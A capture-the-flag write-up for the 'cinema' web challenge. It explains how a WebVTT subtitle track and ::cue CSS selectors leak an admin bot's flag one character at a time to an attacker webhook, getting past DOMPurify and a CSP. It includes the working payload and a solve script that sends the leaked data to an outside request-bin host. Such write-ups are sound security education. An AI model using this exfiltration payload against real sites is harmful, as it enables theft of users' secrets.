## cinema  

<img src="images/chall.png" width=600>

This chall involves a Flask server that handles movie reviews.  

Based on the admin bot report functionality, we can conclude that this is a XSS challenge.  

```python
@app.route("/report", methods=["GET", "POST"])
def report():
    log_visit()
    if request.method == "POST":
        path = request.form.get("path")
        if not path:
            return render_template("report.html", msg="fail")

        if path.startswith("/"):
            path = path[1:]

        url = f"http://127.0.0.1/{path}"
        if check_url(url):
            return render_template("report.html", msg="success")
        else:
            return render_template("report.html", msg="fail")
    else:
        return render_template("report.html")

def check_url(url):
    try:
        service = Service(ChromeDriverManager().install())
        options = webdriver.ChromeOptions()
        options.add_argument("--headless=new")
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--disable-features=BlockInsecurePrivateNetworkRequests')
        options.add_argument('--incognito')
        driver = webdriver.Chrome(service=service, options=options)
        driver.set_page_load_timeout(3)
        driver.get(url)
        sleep(1)
        return True
    except Exception as e:
        return False
    finally:
        driver.quit()
```

Another big hint about the nature of the challenge lies in the CSP headers being set on the requests.  

The CSP only allows same-origin scripts and a DOMPurify@3.1.6 script, but enforces virtually no restrictions on CSS with `style-src 'unsafe-inline'`. This heavily hints at a CSS injection XSS vector.  

```python
@app.after_request
def set_headers(response):
    csp = (
        "script-src 'self' https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.1.6/purify.min.js; "
        "style-src 'unsafe-inline'; "
        "font-src 'none'; "
        "media-src 'self';"
    )
    response.headers['Content-Security-Policy'] = csp
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Document-Policy'] = 'force-load-at-top'
    response.headers['Cache-Control'] = 'no-store'
    return response
```

The main functionality in the webpage is in the `/review` endpoint, which makes it a rather unconventional XSS setup.  

`/review` allows us to supply a string, which it will prepend to the flag text when the admin bot visits the endpoint, then serve the final string as a text file.  

There are a bunch of checks regarding the user-supplied string, but we don't have to concern ourselves with them for now.  

```python
@app.route('/review', methods=["GET"])
def review():
    log_visit()
    text = request.args.get('text', '')
    
    if not isinstance(text, str):
        return 'string... plz', 200

    if len(text) < 20:
        return 'Tooooo short... plz', 200

    if len(text) > 50:
        return 'Tooooo long... plz', 200

    for char in text:
        char_code = ord(char)
        if (char_code < 9 or (char_code > 13 and char_code < 32) or char_code > 127):
            return 'ASCII...plz', 200
    
    if request.remote_addr == '127.0.0.1':
        response_text = f"{text} {FLAG}"
    else:
        response_text = f"{text} {REVIEWS}"

    response = Response(response_text.encode('utf-8'))
    response.headers['Content-Type'] = 'text/plain; charset=utf-8'
    return response
```

If we look at the frontend code, the `index.html` template includes a static script `code.js`.  

`code.js` initialises a video frame, but also allows us to supply a XSS payload, which it sanitises with DOMPurify@3.1.6 and inserts into the `<video>` element.  

```js
document.addEventListener('DOMContentLoaded', (event) => {
    const video = document.getElementById('cinemaVideo');
    const playPauseBtn = document.getElementById('playPauseBtn');
    const videoContainer = document.getElementById('videoContainer');
    
    function togglePlayPause() {
        if (video.paused) {
            video.play();
            playPauseBtn.textContent = 'Pause';
            playPauseBtn.style.opacity = '0';
        } else {
            video.pause();
            playPauseBtn.textContent = 'Play';
            playPauseBtn.style.opacity = '0.8';
        }
    }

    playPauseBtn.addEventListener('click', togglePlayPause);
    
    video.addEventListener('play', () => {
        playPauseBtn.textContent = 'Pause';
        playPauseBtn.style.opacity = '0';
    });

    video.addEventListener('pause', () => {
        playPauseBtn.textContent = 'Play';
        playPauseBtn.style.opacity = '0.8';
    });

    videoContainer.addEventListener('mouseover', () => {
        playPauseBtn.style.opacity = '0.8';
    });

    videoContainer.addEventListener('mouseout', () => {
        if (!video.paused) {
            playPauseBtn.style.opacity = '0';
        }
    });

    video.play().catch(error => {
        console.log("Autoplay was prevented. User interaction may be required to start the video.");
        playPauseBtn.style.opacity = '0.8';
    });
});

window.addEventListener('load', () => {
    let params = new URLSearchParams(window.location.search);
    let xss = params.get('xss');
    let sanitize_xss = DOMPurify.sanitize(xss);
    document.getElementById("cinemaVideo").innerHTML = sanitize_xss;
});
```

If we do a bit of digging, we can find [this chall](
https://nese.team/posts/n1ctf2023/), which has an almost identical setup.  

Essentially, we load the flag text as a WebVTT subtitle file using the `<track>` tag, then use CSS selectors as an oracle to bruteforce the flag.  

This exploit requires us to prepend `WEBVTT%0d00:00.000-->00:30.000%0d<v` to the subtitle file, which perfectly fits under the length constraints in `/review` from earlier.  

<img src="images/poc.png" width=800>

We can adapt from the writeup, giving us the POC payload below.  

An important thing to note is that since DOMPurify sanitises stuff like `-->` and stray `<`, we have to double URL-encode those in our payload to prevent DOMPurify from messing it up.  

```html
<track default src="/review?text=WEBVTT%0d00:00.000%2D%2D%3E00:30.000%0d%3Cv"/>
    <style>
        ::cue(v[voice^="YISF{a"]){
            background:url(<webhook>?e=YISF{a)
        }

        ::cue(v[voice^="YISF{b"]){
            background:url(<webhook>?e=YISF{b)
        }

        ...
    </style>
```

Using an alphanumeric charset, we just have to continuously submit our payload to `/report` to exfiltrate each successive character in the flag to our webhook.  

<img src="images/flag.png" width=800>

Below is my full solve script for this challenge. 

```python
import requests
from urllib.parse import quote
import string

url = 'http://host3.dreamhack.games:12595/'
s = requests.Session()

charset = string.ascii_letters + string.digits + '_}'

webhook = 'http://cvkivvu.request.dreamhack.games'
known = 'YISF{'

def gen_payload():
    cands = []

    for char in charset:
        guess = known + char

        cands.append('::cue(v[voice^="%s"]){background:url(%s?e=%s)}' % (guess, webhook, guess))

    return f'<track default src="/review?text=WEBVTT%0d00:00.000-->00:30.000%0d%3Cv"/><style>{''.join(cands)}</style>'.replace('-->', '%2D%2D%3E')

payload = gen_payload()

res = s.post(f'{url}/report', data={
    'path': f'?xss={quote(payload)}'
})

assert 'success' in res.text.lower()
print("> Reported payload")
```

Flag: `YISF{CsS_1NJECtiOn_4nD_html_iNjec7IOn_wITH_cue_AnD_7rACk_7O_1EAK_aNoTh3r_p4GE}`